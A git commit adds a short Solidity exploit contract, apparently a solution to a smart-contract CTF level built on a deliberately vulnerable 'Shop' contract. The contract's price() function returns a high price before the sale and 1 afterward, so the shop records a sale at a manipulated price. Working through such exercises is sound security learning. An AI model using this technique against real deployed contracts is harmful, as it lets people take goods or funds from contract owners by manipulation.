3f2276ec66e3ac0953f2b3e4e08789bf437bb29a
Duncan Kibet <92955713+Duncan254-u@users.noreply.github.com>
2026-03-02 06:42:24 +0300

    Implement attack contract for Ishop interface

--- shop/attack.sol
+++ shop/attack.sol
@@ -1,1 +1,29 @@
 
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface Ishop {
+    function buy() external;
+    function isSold() external view returns (bool);
+
+    
+    }
+contract shopAttack{
+    Ishop public target;
+
+    constructor (address _target) {
+        target = Ishop (_target);
+
+    }
+    function attack() external {
+        target.buy
+        ();
+    }
+    function price () external view returns (uint) {
+         if (target.isSold()) {
+            return 1;
+         } else {
+            return 100;
+         }
+    }
+}
